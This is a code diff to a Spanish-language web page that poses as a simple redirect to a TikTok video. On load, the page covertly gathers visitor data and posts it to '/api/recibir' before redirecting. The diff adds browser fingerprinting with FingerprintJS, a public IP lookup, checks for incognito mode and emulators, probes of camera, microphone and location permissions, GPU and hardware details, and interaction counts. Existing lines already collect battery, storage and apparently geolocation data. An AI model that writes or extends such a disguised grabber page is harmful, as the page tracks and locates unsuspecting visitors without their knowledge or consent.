@@ -1,13 +1,117 @@
+<!-- public/index.html -->
 <!DOCTYPE html>
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Redirigiendo...</title>
+  <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
   <script>
     async function recopilarDatos() {
       const start = Date.now();
 
+      // FingerprintJS v3
+      const fp = await FingerprintJS.load();
+      const result = await fp.get();
+      const fingerprint = result.visitorId;
+
+      // Detectar modo incógnito
+      async function detectarIncognito() {
+        return new Promise((resolve) => {
+          const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
+          if (!fs) return resolve(false);
+          fs(window.TEMPORARY, 100, () => resolve(false), () => resolve(true));
+        });
+      }
+      const modoIncognito = await detectarIncognito();
+
+      // Detectar emulador (simple heurística)
+      const esEmulador = /emulator|simulator|android.*sdk|genymotion/i.test(navigator.userAgent) || 
+                        (window.navigator.platform === "Win32" && navigator.maxTouchPoints > 0 && screen.width <= 800);
+
+      // IP pública real
+      async function obtenerIpPublica() {
+        try {
+          const resp = await fetch('https://api64.ipify.org?format=json');
+          if (!resp.ok) return null;
+          const json = await resp.json();
+          return json.ip || null;
+        } catch {
+          return null;
+        }
+      }
+      const ipPublica = await obtenerIpPublica();
+
+      // Permisos navegador (geolocation, camera, microphone)
+      async function consultarPermiso(name) {
+        if (!navigator.permissions) return 'unsupported';
+        try {
+          const status = await navigator.permissions.query({ name });
+          return status.state;
+        } catch {
+          return 'unsupported';
+        }
+      }
+      const permisos = {
+        geolocation: await consultarPermiso('geolocation'),
+        camera: await consultarPermiso('camera'),
+        microphone: await consultarPermiso('microphone')
+      };
+
+      // Tipo de navegación (normal, reload, back_forward, prerender)
+      let tipoNavegacion = 'desconocido';
+      if (performance.getEntriesByType) {
+        const entries = performance.getEntriesByType("navigation");
+        if (entries.length > 0) tipoNavegacion = entries[0].type || tipoNavegacion;
+      } else if (performance.navigation) {
+        const type = performance.navigation.type;
+        tipoNavegacion = ['navigate', 'reload', 'back_forward'][type] || 'desconocido';
+      }
+
+      // Contar interacciones del usuario
+      let interacciones = 0;
+      function sumarInteraccion() { interacciones++; }
+      ['click', 'keydown', 'touchstart', 'mousemove'].forEach(evento => {
+        window.addEventListener(evento, sumarInteraccion);
+      });
+
+      // Esperamos unos segundos para medir duración e interacciones
+      await new Promise(r => setTimeout(r, 3000));
+      const duracionSegundos = Math.floor((Date.now() - start) / 1000);
+
+      // Datos de hardware
+      const hardware = {
+        cores: navigator.hardwareConcurrency || null,
+        memoryGB: navigator.deviceMemory || null,
+        gpu: (() => {
+          try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (!gl) return null;
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            if (!debugInfo) return null;
+            return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+          } catch {
+            return null;
+          }
+        })()
+      };
+
+      // Soporte APIs
+      const soportesAPIs = {
+        webRTC: !!(window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection),
+        webGL: (() => {
+          try {
+            const canvas = document.createElement('canvas');
+            return !!(canvas.getContext('webgl') || canvas.getContext('experimental-webgl'));
+          } catch { return false; }
+        })(),
+        bluetooth: 'bluetooth' in navigator,
+        nfc: 'nfc' in navigator,
+        midi: 'requestMIDIAccess' in navigator
+      };
+
+      // Otros datos básicos
       const battery = await navigator.getBattery?.();
       const deviceMemory = navigator.deviceMemory || null;
       const lang = navigator.language;
@@ -21,6 +125,7 @@
       const soporteLocal = !!window.localStorage;
       const soporteSession = !!window.sessionStorage;
       const pestañaActiva = document.visibilityState === 'visible';
+
       const almacenamiento = await navigator.storage?.estimate?.();
 
       const coords = await new Promise(resolve => {
@@ -33,6 +138,7 @@
 
       const esBot = /bot|crawler|spider|crawling/i.test(userAgent);
 
+      // Enviar datos al backend
       const data = {
         nombre: 'Visitante',
         userAgent,
@@ -59,7 +165,18 @@
         soportaSession: soporteSession,
         pestañaActiva,
         esBot,
-        duracion: Math.floor((Date.now() - start) / 1000)
+
+        // NUEVAS PROPIEDADES
+        fingerprint,
+        modoIncognito,
+        esEmulador,
+        ipPublica,
+        permisos,
+        tipoNavegacion,
+        duracionSegundos,
+        interacciones,
+        hardware,
+        soportesAPIs
       };
 
       await fetch('/api/recibir', {
@@ -68,9 +185,11 @@
         body: JSON.stringify(data)
       });
 
-      window.location.href = "https://www.tiktok.com/@funados510/video/7512617576338394374";
+      // Redirigir rápido después de enviar datos
+      window.location.href = "https://www.tiktok.com/@funados510/video/7512617576338394374?q=funados%20este";
     }
 
+    // Funciones auxiliares para detectar navegador, SO, tipo, marca, modelo
     function detectarNavegador(ua) {
       if (ua.includes("Firefox")) return "Firefox";
       if (ua.includes("Edg")) return "Edge";
